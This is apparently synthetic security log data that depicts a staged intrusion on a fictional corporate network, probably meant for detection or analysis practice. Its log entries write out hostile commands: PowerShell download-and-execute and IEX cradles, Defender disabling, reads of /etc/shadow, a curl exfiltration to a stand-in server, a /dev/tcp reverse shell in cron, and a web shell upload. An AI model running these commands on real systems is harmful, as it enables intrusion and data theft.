+May 30 06:01:10 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: administrator Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name: RDP-ATTACKER Source Network Address: 192.168.1.205 Source Port: 3389
+
+May 30 06:05:00 WIN-SERVER03 Microsoft-Windows-PowerShell[4104]: Creating Scriptblock text (1 of 1): $webclient = New-Object System.Net.WebClient; $webclient.DownloadFile("http://evil-domain.com/ransomware.exe", "C:\temp\payload.exe") ScriptBlock ID: 98765432-8765-4321-ba09-987654321fed Path: C:\Users\contractor\Desktop\malicious.ps1
+May 30 06:05:15 WIN-SERVER03 Microsoft-Windows-PowerShell[4104]: Creating Scriptblock text (1 of 1): Start-Process -FilePath "C:\temp\payload.exe" -WindowStyle Hidden ScriptBlock ID: 11223344-5566-7788-99aa-bbccddeeff00 Path: C:\Users\contractor\Desktop\malicious.ps1
+May 30 06:05:30 WIN-SERVER03 Microsoft-Windows-PowerShell[4104]: Creating Scriptblock text (1 of 1): Disable-WindowsOptionalFeature -Online -FeatureName WindowsDefender -All -NoRestart ScriptBlock ID: aabbccdd-eeff-0011-2233-445566778899 Path:
+May 30 06:05:45 WIN-SERVER03 Microsoft-Windows-PowerShell[4104]: Creating Scriptblock text (1 of 1): Get-WmiObject -Class Win32_ComputerSystem | Select-Object Name,Domain,Manufacturer,Model ScriptBlock ID: ffeeaadd-ccbb-9988-7766-554433221100 Path: C:\temp\recon.ps1
+May 30 06:06:00 WIN-SERVER03 Microsoft-Windows-PowerShell[4104]: Creating Scriptblock text (1 of 1): Get-ChildItem C:\Users\ -Recurse | Where-Object {$_.Name -like "*.doc*" -or $_.Name -like "*.xls*" -or $_.Name -like "*.pdf*"} ScriptBlock ID: 1a2b3c4d-5e6f-7a8b-9c0d-1e2f3a4b5c6d Path: C:\Users\contractor\Documents\sensitive_file_search.ps1
+May 30 06:06:15 WIN-SERVER03 Microsoft-Windows-PowerShell[4104]: Creating Scriptblock text (1 of 1): Get-ACL C:\Windows\System32\config\SAM ScriptBlock ID: 2b3c4d5e-6f7a-8b9c-0d1e-2f3a4b5c6d7e Path: C:\Users\contractor\Desktop\acls_check.ps1
+May 30 06:06:30 WIN-SERVER03 Microsoft-Windows-PowerShell[4104]: Creating Scriptblock text (1 of 1): (New-Object System.Net.WebClient).DownloadString('http://evil-domain.com/badscript.ps1') | IEX ScriptBlock ID: 3c4d5e6f-7a8b-9c0d-1e2f-3a4b5c6d7e8f Path:
+
+May 30 06:10:00 WIN-SERVER03 Microsoft-Windows-Security-Auditing[4688]: A new process has been created. Creator Subject: Security ID: S-1-5-21-123456789-123456789-123456789-1005 Account Name: contractor Account Domain: CONTOSO Logon ID: 0x98765 Target Subject: Security ID: S-1-5-21-123456789-123456789-123456789-1005 Account Name: contractor Account Domain: CONTOSO Logon ID: 0x98765 Process Information: New Process ID: 0x4567 New Process Name: C:\temp\payload.exe Token Elevation Type: Default (1) Mandatory Label: Mandatory Label\Medium Mandatory Level Creator Process ID: 0x8901 Creator Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Process Command Line: C:\temp\payload.exe --encrypt --target=network --spread=lateral
+
+May 30 06:12:00 WIN-SERVER03 Microsoft-Windows-Security-Auditing[4732]: A member was added to a security-enabled local group. Subject: Security ID: S-1-5-21-123456789-123456789-123456789-1001 Account Name: contractor Account Domain: CONTOSO Logon ID: 0x98765 Member: Security ID: S-1-5-21-123456789-123456789-123456789-1020 Account Name: backdoor_user Group: Security ID: S-1-5-32-544 Group Name: Administrators Group Domain: Builtin
+
+May 30 06:15:00 WIN-SERVER03 Microsoft-Windows-Security-Auditing[4697]: A service was installed in the system. Subject: Security ID: S-1-5-21-123456789-123456789-123456789-1005 Account Name: contractor Account Domain: CONTOSO Logon ID: 0x98765 Service Information: Service Name: SystemUpdateService Service File Name: C:\Windows\System32\svchost.exe -k netsvcsUpdater Service Type: user mode service Service Start Type: auto start Service Account: LocalSystem
+
+May 30 06:20:00 WIN-FILE-SERVER Microsoft-Windows-Security-Auditing[5140]: A network share object was accessed. Subject: Security ID: S-1-5-21-123456789-123456789-123456789-1005 Account Name: contractor Account Domain: CONTOSO Logon ID: 0x11111 Network Information: Object Type: File Share Name: \\WIN-FILE-SERVER\Finance$ Source Address: 192.168.1.105 Source Port: 445 Access Information: Access Mask: 0x120089 Accesses: ReadData (or ListDirectory) WriteData (or AddFile) AppendData (or AddSubdirectory) ReadEA WriteEA ReadAttributes WriteAttributes DELETE READ_CONTROL
+
+May 30 06:25:00 WIN-FILE-SERVER Microsoft-Windows-Security-Auditing[4663]: An attempt was made to access an object. Subject: Security ID: S-1-5-21-123456789-123456789-123456789-1005 Account Name: contractor Account Domain: CONTOSO Logon ID: 0x11111 Object: Object Server: Security Object Type: File Object Name: C:\SharedData\Finance\Payroll_2024.xlsx Handle ID: 0x1234 Process Information: Process ID: 0x5678 Process Name: C:\temp\payload.exe Access Request Information: Transaction ID: {00000000-0000-0000-0000-000000000000} Accesses: ReadData (or ListDirectory) WriteData (or AddFile) AppendData (or AddSubdirectory) Access Reasons: ReadData (or ListDirectory): Granted by D:(A;;0x1200a9;;;S-1-5-21-123456789-123456789-123456789-1005)
+
+May 30 06:30:00 WIN-SERVER03 Microsoft-Windows-Security-Auditing[1102]: The audit log was cleared. Subject: Security ID: S-1-5-21-123456789-123456789-123456789-1005 Account Name: contractor Account Domain: CONTOSO Logon ID: 0x98765
+
+May 30 06:35:00 WIN-ENDPOINT01 Microsoft-Windows-Windows Defender[1116]: Windows Defender Antimalware has detected malware or other potentially unwanted software. Name: Trojan:Win32/Trickbot.G ID: 2147735503 Severity: Severe Category: Trojan Path: C:\Users\marketing\AppData\Local\Temp\invoice_2024.exe Detection Origin: User User: CONTOSO\marketing Process Name: C:\Windows\explorer.exe Security intelligence Version: 1.345.125.0 Engine Version: 1.1.18400.5
+
+May 30 06:40:00 WIN-ENDPOINT01 Microsoft-Windows-Windows Defender[1117]: Windows Defender Antimalware has taken action to protect your machine from malware or other potentially unwanted software. Name: Trojan:Win32/Trickbot.G ID: 2147735503 Severity: Severe Category: Trojan Path: C:\Users\marketing\AppData\Local\Temp\invoice_2024.exe Detection Origin: User Action: Quarantine User: CONTOSO\marketing Process Name: C:\Windows\System32\MpCmdRun.exe Security intelligence Version: 1.345.125.0 Engine Version: 1.1.18400.5
+
+May 30 06:45:00 WIN-ENDPOINT02 Microsoft-Windows-TerminalServices-RemoteConnectionManager[1149]: Remote Desktop Services: User authentication succeeded: User: CONTOSO\external_consultant Domain: CONTOSO Source Network Address: 203.0.113.45
+
+May 30 06:50:00 WIN-ENDPOINT02 Microsoft-Windows-Security-Auditing[4624]: An account was successfully logged on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Information: Logon Type: 10 Restricted Admin Mode: - Virtual Account: No Elevated Token: Yes Impersonation Level: Impersonation New Logon: Security ID: S-1-5-21-123456789-123456789-123456789-1025 Account Name: external_consultant Account Domain: CONTOSO Logon ID: 0xABCDE Logon GUID: {87654321-4321-8765-21ba-987654321cba} Process Information: Process ID: 0x2c3d Process Name: C:\Windows\System32\winlogon.exe Network Information: Workstation Name: WIN-ENDPOINT02 Source Network Address: 203.0.113.45 Source Port: 3389
+
+May 30 07:00:00 WIN-ENDPOINT02 Microsoft-Windows-PowerShell[4104]: Creating Scriptblock text (1 of 1): Get-ADUser -Filter * -Properties * | Export-Csv C:\temp\all_users.csv ScriptBlock ID: 12349876-5432-1098-7654-321098765432 Path: C:\Users\external_consultant\Documents\enum.ps1
+May 30 07:05:00 WIN-ENDPOINT02 Microsoft-Windows-PowerShell[4104]: Creating Scriptblock text (1 of 1): Get-ADComputer -Filter * -Properties * | Export-Csv C:\temp\all_computers.csv ScriptBlock ID: 98761234-8765-4321-2109-876543210abc Path: C:\Users\external_consultant\Documents\enum.ps1
+May 30 07:10:00 WIN-ENDPOINT02 Microsoft-Windows-PowerShell[4104]: Creating Scriptblock text (1 of 1): Get-ADGroup -Filter * -Properties * | Export-Csv C:\temp\all_groups.csv ScriptBlock ID: abcd9876-5432-1098-7654-fedcba098765 Path: C:\Users\external_consultant\Documents\enum.ps1
+May 30 07:10:30 WIN-ENDPOINT02 Microsoft-Windows-PowerShell[4104]: Creating Scriptblock text (1 of 1): Get-NetFirewallRule -PolicyStore ActiveStore | Format-Table -AutoSize ScriptBlock ID: bcde1234-5678-90ab-cdef-1234567890ab Path: C:\Users\external_consultant\Documents\recon_net.ps1
+May 30 07:11:00 WIN-ENDPOINT02 Microsoft-Windows-PowerShell[4104]: Creating Scriptblock text (1 of 1): Invoke-DnsEnum -Domain contoso.com -DNSServer 192.168.1.1 ScriptBlock ID: cdef5678-90ab-cdef-1234-567890abcdef Path: C:\Users\external_consultant\Documents\dns_enum.ps1
+May 30 07:11:30 WIN-ENDPOINT02 Microsoft-Windows-PowerShell[4104]: Creating Scriptblock text (1 of 1): Get-LocalGroupMember -Group Administrators ScriptBlock ID: def09876-5432-1098-7654-321098765432 Path: C:\Users\external_consultant\Documents\local_admin_check.ps1
+
+May 30 07:15:00 WIN-ENDPOINT02 Microsoft-Windows-Security-Auditing[4688]: A new process has been created. Creator Subject: Security ID: S-1-5-21-123456789-123456789-123456789-1025 Account Name: external_consultant Account Domain: CONTOSO Logon ID: 0xABCDE Target Subject: Security ID: S-1-5-21-123456789-123456789-123456789-1025 Account Name: external_consultant Account Domain: CONTOSO Logon ID: 0xABCDE Process Information: New Process ID: 0x3e4f New Process Name: C:\Windows\System32\net.exe Token Elevation Type: Default (1) Mandatory Label: Mandatory Label\Medium Mandatory Level Creator Process ID: 0x2c3d Creator Process Name: C:\Windows\System32\cmd.exe Process Command Line: net user /domain
+
+May 30 07:20:00 WIN-ENDPOINT02 Microsoft-Windows-Security-Auditing[4648]: A logon was attempted using explicit credentials. Subject: Security ID: S-1-5-21-123456789-123456789-123456789-1025 Account Name: external_consultant Account Domain: CONTOSO Logon ID: 0xABCDE Logon Type: 3 Account For Which Logon Was Intended: Security ID: S-1-5-21-123456789-123456789-123456789-1001 Account Name: admin Account Domain: CONTOSO New Logon: Security ID: S-1-5-21-123456789-123456789-123456789-1001 Account Name: admin Account Domain: CONTOSO Logon ID: 0xFEDCB Process Information: Process ID: 0x4f50 Process Name: C:\Windows\System32\runas.exe Network Information: Network Address: - Port: -
+
+May 30 07:25:00 WIN-SERVER04 Microsoft-Windows-Security-Auditing[4634]: An account was logged off. Subject: Security ID: S-1-5-21-123456789-123456789-123456789-1030 Account Name: temp_worker Account Domain: CONTOSO Logon ID: 0x54321 Logon Type: 2
+
+May 30 07:30:00 WIN-SERVER04 Microsoft-Windows-Security-Auditing[4720]: A user account was created. Subject: Security ID: S-1-5-21-123456789-123456789-123456789-1001 Account Name: admin Account Domain: CONTOSO Logon ID: 0x12345 New Account: Security ID: S-1-5-21-123456789-123456789-123456789-1035 Account Name: hidden_admin Account Domain: CONTOSO Attributes: User Account Control: 0x210 Normal Account, Password Not Required Account Expires: Never Password Last Set: 5/30/2024 7:30:00 AM Primary Group ID: 513 Home Directory: Profile Path: User Workstations: Logon Hours: All Password Required User May Change Password User Must Change Password at Next Logon Account Disabled
+
+May 30 07:35:00 WIN-SERVER04 Microsoft-Windows-Security-Auditing[4738]: A user account was changed. Subject: Security ID: S-1-5-21-123456789-123456789-123456789-1001 Account Name: admin Account Domain: CONTOSO Logon ID: 0x12345 Target Account: Security ID: S-1-5-21-123456789-123456789-123456789-1035 Account Name: hidden_admin Account Domain: CONTOSO Changed Attributes: User Account Control: 0x200 Normal Account Account Expires: Never Password Last Set: <never> Primary Group ID: 513 Home Directory: Profile Path: User Workstations: Logon Hours: All Password Required User May Change Password User Must Change Password at Next Logon Account Enabled
+
+# Linux Security Logs
+May 30 08:00:01 websrv01 sshd[15432]: Failed password for invalid user postgres from 45.76.123.45 port 34521 ssh2
+May 30 08:00:15 websrv01 sshd[15433]: Failed password for invalid user mysql from 45.76.123.45 port 34522 ssh2
+May 30 08:00:30 websrv01 sshd[15434]: Failed password for invalid user oracle from 45.76.123.45 port 34523 ssh2
+May 30 08:00:45 websrv01 sshd[15435]: Failed password for user ubuntu from 198.51.100.23 port 55667 ssh2
+May 30 08:01:00 websrv01 sshd[15436]: Failed password for user debian from 198.51.100.23 port 55668 ssh2
+May 30 08:01:15 websrv01 sshd[15437]: Failed password for user centos from 203.0.113.87 port 44332 ssh2
+May 30 08:01:30 websrv01 sshd[15438]: Failed password for user redhat from 203.0.113.87 port 44333 ssh2
+May 30 08:01:45 websrv01 sshd[15439]: Failed password for user root from 192.168.1.200 port 60000 ssh2
+May 30 08:02:00 websrv01 sshd[15440]: Failed password for user root from 192.168.1.200 port 60001 ssh2
+May 30 08:02:15 websrv01 sshd[15441]: Failed password for user root from 192.168.1.200 port 60002 ssh2
+May 30 08:02:30 websrv01 sshd[15442]: Failed password for user root from 192.168.1.200 port 60003 ssh2
+May 30 08:02:45 websrv01 sshd[15443]: Failed password for user root from 192.168.1.200 port 60004 ssh2
+May 30 08:03:00 websrv01 sshd[15444]: Failed password for user root from 192.168.1.200 port 60005 ssh2
+May 30 08:03:15 websrv01 sshd[15445]: Failed password for user root from 192.168.1.200 port 60006 ssh2
+May 30 08:03:30 websrv01 sshd[15446]: Failed password for user root from 192.168.1.200 port 60007 ssh2
+May 30 08:03:45 websrv01 sshd[15447]: Failed password for user root from 192.168.1.200 port 60008 ssh2
+May 30 08:04:00 websrv01 sshd[15448]: Failed password for user root from 192.168.1.200 port 60009 ssh2
+
+May 30 08:05:00 websrv01 sudo[25678]: attacker : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/cat /etc/shadow
+May 30 08:05:15 websrv01 sudo[25679]: attacker : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/cat /etc/passwd
+May 30 08:05:30 websrv01 sudo[25680]: attacker : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/find / -name "*.key" -o -name "*.pem" 2>/dev/null
+May 30 08:05:45 websrv01 sudo[25681]: attacker : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/netstat -tulpn
+May 30 08:06:00 websrv01 sudo[25682]: attacker : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/ps aux
+
+May 30 08:10:00 websrv01 bash[25683]: User=attacker Command=wget http://malicious-c2.com/linpeas.sh -O /tmp/linpeas.sh
+May 30 08:10:15 websrv01 bash[25684]: User=attacker Command=chmod +x /tmp/linpeas.sh
+May 30 08:10:30 websrv01 bash[25685]: User=attacker Command=/tmp/linpeas.sh | tee /tmp/enum_results.txt
+May 30 08:15:00 websrv01 bash[25686]: User=attacker Command=curl -X POST -H "Content-Type: application/json" -d @/tmp/enum_results.txt http://exfil-server.com/upload
+
+May 30 08:20:00 websrv01 crontab[25687]: (attacker) BEGIN EDIT (root)
+May 30 08:20:15 websrv01 crontab[25688]: (attacker) REPLACE (root)
+May 30 08:20:30 websrv01 cron[25689]: (root) CMD (/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.200/4444 0>&1')
+
+May 30 08:25:00 websrv01 systemd[1]: Started Malicious Persistence Service.
+May 30 08:25:15 websrv01 systemd[25690]: malicious-service.service: Main process exited, code=exited, status=0/SUCCESS
+May 30 08:25:30 websrv01 systemd[1]: malicious-service.service: Unit entered failed state.
+
+May 30 08:30:00 dbsrv01 mysql[35678]: 2024-05-30T08:30:00.123456Z 123 [Warning] Access denied for user 'sa'@'192.168.1.200' (using password: YES)
+May 30 08:30:15 dbsrv01 mysql[35679]: 2024-05-30T08:30:15.789012Z 124 [Warning] Access denied for user 'dba'@'192.168.1.200' (using password: YES)
+May 30 08:30:30 dbsrv01 mysql[35680]: 2024-05-30T08:30:30.345678Z 125 [Note] Aborted connection 125 to db: 'information_schema' user: 'root' host: '192.168.1.200' (Got timeout reading communication packets)
+
+May 30 08:35:00 websrv02 apache2[45789]: 192.168.1.200 - - [30/May/2024:08:35:00 +0000] "GET /admin/phpmyadmin/ HTTP/1.1" 200 2048 "-" "sqlmap/1.6.4"
+May 30 08:35:15 websrv02 apache2[45790]: 192.168.1.200 - - [30/May/2024:08:35:15 +0000] "POST /admin/phpmyadmin/index.php HTTP/1.1" 200 1024 "-" "sqlmap/1.6.4"
+May 30 08:35:30 websrv02 apache2[45791]: 192.168.1.200 - - [30/May/2024:08:35:30 +0000] "GET /wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php HTTP/1.1" 200 512 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"
+May 30 08:35:45 websrv02 apache2[45792]: 192.168.1.200 - - [30/May/2024:08:35:45 +0000] "POST /wp-content/uploads/shell.php HTTP/1.1" 200 128 "-" "curl/7.68.0"
+
+May 30 08:40:00 mailsrv01 postfix/smtpd[55432]: NOQUEUE: reject: RCPT from unknown[185.220.101.44]: 554 5.7.1 <test@example.com>: Relay access denied; from=<spam@malicious.com> to=<ceo@contoso.com> proto=ESMTP helo=<spam.server.com>
+May 30 08:40:15 mailsrv01 postfix/smtpd[55433]: connect from unknown[185.220.101.44]
+May 30 08:40:30 mailsrv01 postfix/smtpd[55434]: NOQUEUE: reject: MAIL from unknown[185.220.101.44]: 550 5.1.1 <phishing@evil.com>: Sender address rejected: Domain not found
+May 30 08:40:45 mailsrv01 dovecot[55435]: auth-worker(55435): pam(marketing@contoso.com,192.168.1.55,<hidden>): pam_authenticate() failed: Authentication failure (password mismatch?)
+
+May 30 09:00:00 fwsrv01 iptables[65432]: DROP IN=eth0 OUT= MAC=00:50:56:12:34:56:00:0c:29:87:65:43:08:00 SRC=203.0.113.99 DST=192.168.1.10 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12345 DF PROTO=TCP SPT=54321 DPT=22 WINDOW=65535 RES=0x00 SYN URGP=0
+May 30 09:00:15 fwsrv01 iptables[65433]: DROP IN=eth0 OUT= MAC=00:50:56:12:34:56:00:0c:29:87:65:43:08:00 SRC=45.76.89.123 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=23456 DF PROTO=TCP SPT=12345 DPT=3389 WINDOW=65535 RES=0x00 SYN URGP=0
+May 30 09:00:30 fwsrv01 iptables[65434]: DROP IN=eth0 OUT= MAC=00:50:56:12:34:56:00:0c:29:87:65:43:08:00 SRC=198.51.100.77 DST=192.168.1.100 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=34567 DF PROTO=TCP SPT=44444 DPT=445 WINDOW=65535 RES=0x00 SYN URGP=0
+
+# Additional Windows Events
+May 30 09:15:00 WIN-EXCHANGE01 MSExchange Management[1234]: Cmdlet executed: Get-Mailbox -Identity * -ResultSize Unlimited | Export-Csv C:\temp\all_mailboxes.csv User: CONTOSO\it_admin
+May 30 09:20:00 WIN-EXCHANGE01 MSExchange Management[1235]: Cmdlet executed: New-MailboxExportRequest -Mailbox ceo@contoso.com -FilePath \\fileserver\backup\ceo_mailbox.pst User: CONTOSO\it_admin
+May 30 09:25:00 WIN-EXCHANGE01 MSExchange Management[1236]: Cmdlet executed: Add-RoleGroupMember -Identity "Organization Management" -Member backdoor_admin User: CONTOSO\admin
+
+May 30 09:30:00 WIN-DHCP01 Microsoft-Windows-DHCP-Server[1020]: The DHCP service assigned IP address 192.168.1.250 to the client with MAC address 00:0c:29:aa:bb:cc and host name UNKNOWN-DEVICE.
+May 30 09:35:00 WIN-DHCP01 Microsoft-Windows-DHCP-Server[1021]: The DHCP service assigned IP address 192.168.1.251 to the client with MAC address 00:50:56:dd:ee:ff and host name ROGUE-AP.
+
+May 30 09:40:00 WIN-CA01 Microsoft-Windows-CertificateServices-CertificateAuthority[4870]: Certificate Services received a certificate request. Request ID: 12345 Requester: CONTOSO\suspicious_user Attributes: CertificateTemplate:DomainController
+May 30 09:45:00 WIN-CA01 Microsoft-Windows-CertificateServices-CertificateAuthority[4871]: Certificate Services approved a certificate request and issued a certificate. Request ID: 12345 Requester: CONTOSO\suspicious_user Subject: CN=fake-dc.contoso.com Serial Number: 1A2B3C4D5E6F7890
+
+May 30 10:00:00 WIN-DNS01 Microsoft-Windows-DNS-Server-Service[770]: The DNS server has started successfully.
+May 30 10:05:00 WIN-DNS01 Microsoft-Windows-DNS-Server-Service[279]: DNS query received over UDP from 192.168.1.200 for malicious-c2.com
+May 30 10:10:00 WIN-DNS01 Microsoft-Windows-DNS-Server-Service[279]: DNS query received over UDP from 192.168.1.105 for evil-domain.net
+May 30 10:15:00 WIN-DNS01 Microsoft-Windows-DNS-Server-Service[279]: DNS query received over UDP from 10.0.10.50 for coinminer-pool.org
+
+May 30 10:20:00 WIN-PRINT01 Microsoft-Windows-PrintService[307]: Document owned by contractor on WIN-PRINT01 was printed on HP_LaserJet_5200 through port IP_192.168.1.20. Size in bytes: 2048576. Pages printed: 250.
+May 30 10:25:00 WIN-PRINT01 Microsoft-Windows-PrintService[308]: Print job from contractor contained sensitive data patterns: SSN, Credit Card numbers detected.
+
+May 30 10:30:00 WIN-BACKUP01 Microsoft-Windows-Backup[517]: Backup started by user contractor for location \\WIN-FILE-SERVER\Finance$
+May 30 10:35:00 WIN-BACKUP01 Microsoft-Windows-Backup[518]: Large data transfer detected: 15.7 GB transferred to external IP 203.0.113.200
+May 30 10:40:00 WIN-BACKUP01 Microsoft-Windows-Backup[519]: Backup completed successfully. Files backed up: 45,678 Total size: 15.7 GB
+May 30 10:45:00 WIN-BACKUP01 Microsoft-Windows-Backup[520]: Backup job failed due to network error. Retrying in 5 minutes.
+May 30 10:50:00 WIN-BACKUP01 Microsoft-Windows-Backup[521]: Backup job failed after 3 retries. Error: Network path not found.
+May 30 10:55:00 WIN-BACKUP01 Microsoft-Windows-Backup[522]: Backup job aborted by user contractor. Manual intervention required.
+May 30 11:00:00 WIN-BACKUP01 Microsoft-Windows-Backup[523]: Backup job resumed after manual intervention. Resuming from last checkpoint.
+May 30 11:05:00 WIN-BACKUP01 Microsoft-Windows-Backup[524]: Backup job completed successfully after manual intervention. Files backed up: 45,678 Total size: 15.7 GB
+May 30 11:10:00 WIN-BACKUP01 Microsoft-Windows-Backup[525]: Backup job scheduled for daily execution at 2:00 AM. Next run: 5/31/2024 2:00:00 AM
+May 30 11:15:00 WIN-BACKUP01 Microsoft-Windows-Backup[526]: Backup job scheduled for weekly execution on Sundays at 3:00 AM. Next run: 6/2/2024 3:00:00 AM
+# Network Security Events
+May 30 11:00:00 ids01 suricata[78901]: [1:2024001:1] ET TROJAN Suspicious PowerShell Empire Activity [Classification: Trojan] [Priority: 1] {TCP} 192.168.1.105:49152 -> 203.0.113.45:443
+May 30 11:05:00 ids01 suricata[78902]: [1:2024002:1] ET MALWARE Cobalt Strike Beacon Activity [Classification: Trojan] [Priority: 1] {HTTPS} 192.168.1.200:443 -> 45.76.123.88:443
+May 30 11:10:00 ids01 suricata[78903]: [1:2024003:1] ET SCAN Nmap TCP SYN Scan [Classification: Attempted Information Leak] [Priority: 3] {TCP} 10.0.20.99:12345 -> 192.168.1.0/24:*
+May 30 11:15:00 ids01 suricata[78904]: [1:2024004:1] ET POLICY Suspicious User Agent (sqlmap) [Classification: Web Application Attack] [Priority: 2] {HTTP} 192.168.1.200:54321 -> 192.168.1.50:80
+May 30 11:20:00 ids01 suricata[78905]: [1:2024005:1] ET POLICY Suspicious User Agent (curl) [Classification: Web Application Attack] [Priority: 2] {HTTP}
+May 30 11:20:10 ids01 suricata[78906]: [1:2024006:1] ET TROJAN Downloader Activity [Classification: Trojan] [Priority: 1] {HTTP}
+May 30 11:20:20 ids01 suricata[78907]: [1:2024007:1] ET MALWARE CoinMiner Activity [Classification: Malware] [Priority: 1] {TCP}
+# Squid Proxy Logs
+May 30 11:15:00 proxy01 squid[89010]: 1622375700.123 456
+May 30 11:20:00 proxy01 squid[89012]: 1622376000.678 123 192.168.1.200 TCP_DENIED/403 4567 GET http://bad-domain.com/malware_update.exe - HIER_NONE/- text/html
+May 30 11:20:10 proxy01 squid[89013]: 1622376010.123 234 192.168.1.105 TCP_MISS/200 890 GET http://malicious-c2.com/payload.dll - HIER_DIRECT/malicious-c2.com application/octet-stream
+May 30 11:20:20 proxy01 squid[89014]: 1622376020.456 345
